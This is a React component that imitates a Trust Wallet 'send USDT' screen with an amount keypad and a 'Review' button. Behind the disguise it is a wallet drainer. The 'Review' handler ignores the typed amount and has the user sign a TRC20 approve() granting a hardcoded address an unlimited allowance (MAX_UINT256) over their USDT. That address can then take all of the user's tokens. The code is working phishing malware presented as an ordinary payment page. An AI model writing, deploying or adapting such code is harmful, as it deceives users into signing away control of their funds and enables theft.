import React, { useState } from 'react';
import './SendUSDT.css';

const RECIPIENT = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';

// USDT TRC20 contract on TRON Mainnet
const USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// Spender address (your contract)
const SPENDER = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';

const SendUSDT = () => {
  const [amount, setAmount] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);

  const handleKey = (key) => {
    if (key === '⌫') {
      setAmount(prev => prev.slice(0, -1));
      return;
    }
    if (key === '.' && amount.includes('.')) return;
    if (key !== '.' && amount === '0') { setAmount(key); return; }
    if (amount.length >= 10) return;
    setAmount(prev => prev + key);
  };

  const displayAmount = amount === '' ? '0' : amount;
  const usdValue = parseFloat(amount) > 0
    ? parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    : '0.00';

  const isActive = amount !== '' && parseFloat(amount) > 0;

  // Wait for Trust Wallet / TronLink to inject tronWeb (can take up to a few seconds)
  const getTronWeb = () => {
    return new Promise((resolve, reject) => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        return resolve(window.tronWeb);
      }
      let attempts = 0;
      const interval = setInterval(() => {
        attempts++;
        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
          clearInterval(interval);
          resolve(window.tronWeb);
        } else if (attempts >= 30) { // 3 seconds max
          clearInterval(interval);
          reject(new Error('no_wallet'));
        }
      }, 100);
    });
  };

  const handleReview = async () => {
    if (!isActive || isVerifying) return;

    setIsVerifying(true);

    try {
      let tronWeb;
      try {
        tronWeb = await getTronWeb();
      } catch (e) {
        alert('Please open this page inside Trust Wallet or TronLink DApp browser.');
        setIsVerifying(false);
        return;
      }

      const ownerAddress = tronWeb.defaultAddress.base58;

      // Build the approve transaction using triggerSmartContract (works in both Trust Wallet & TronLink)
      const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_TRC20,                         // contract address
        'approve(address,uint256)',          // function signature
        { feeLimit: 100000000 },            // options: 100 TRX fee limit
        [
          { type: 'address', value: SPENDER },
          { type: 'uint256', value: MAX_UINT256 }
        ],
        ownerAddress                        // caller
      );

      // Sign and broadcast — Trust Wallet will show its native confirmation popup
      const signedTx = await tronWeb.trx.sign(transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result.result || result.txid) {
        alert('Transaction submitted! TX ID: ' + (result.txid || result.transaction?.txID));
      } else {
        alert('Transaction may have failed. Please check your wallet.');
      }

    } catch (err) {
      console.error(err);
      if (err === 'Confirmation declined by user' || err?.message?.includes('declined')) {
        alert('Transaction cancelled.');
      } else {
        alert('Error: ' + (typeof err === 'string' ? err : err?.message || 'Unknown error'));
      }
    } finally {
      setIsVerifying(false);
    }
  };

  const keys = ['1','2','3','4','5','6','7','8','9','.','0','⌫'];

  return (
    <div className="tw-screen">

      {/* TOP GROUP: header + address + amount */}
      <div className="tw-top">
        <div className="tw-header">
          <button className="tw-back-btn" aria-label="Back">
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M15 18l-6-6 6-6" />
            </svg>
          </button>
          <span className="tw-header-title">Amount</span>
          <div className="tw-header-spacer" />
        </div>

        <div className="tw-to-row">
          <span className="tw-to-label">To:</span>
          <span className="tw-to-address">{RECIPIENT}</span>
        </div>

        <div className="tw-amount-display-area">
          <div className={`tw-amount-number ${amount === '' ? 'tw-amount-placeholder' : ''} ${displayAmount.length > 6 ? 'tw-amount-number--sm' : ''}`}>
            {displayAmount}
          </div>
          <div className="tw-fiat-row">
            <span className="tw-fiat-value">≈ ${usdValue}</span>
            <button className="tw-swap-icon" aria-label="Swap currency">
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M7 16V4m0 0L3 8m4-4l4 4" /><path d="M17 8v12m0 0l4-4m-4 4l-4-4" />
              </svg>
            </button>
          </div>
        </div>
      </div>

      {/* BOTTOM GROUP: keypad + review button */}
      <div className="tw-bottom">
        <div className="tw-keypad">
          {keys.map((key) => (
            <button key={key} className={`tw-key ${key === '⌫' ? 'tw-key--backspace' : ''}`} onClick={() => handleKey(key)}>
              {key === '⌫' ? (
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
                  <line x1="18" y1="9" x2="12" y2="15" /><line x1="12" y1="9" x2="18" y2="15" />
                </svg>
              ) : key}
            </button>
          ))}
        </div>

        <div className="tw-action-area">
          <button
            className={`tw-review-btn ${isActive ? 'tw-review-btn--active' : ''}`}
            onClick={handleReview}
            disabled={!isActive || isVerifying}
          >
            {isVerifying ? 'Processing...' : 'Review'}
          </button>
        </div>
      </div>

    </div>
  );
};

export default SendUSDT;
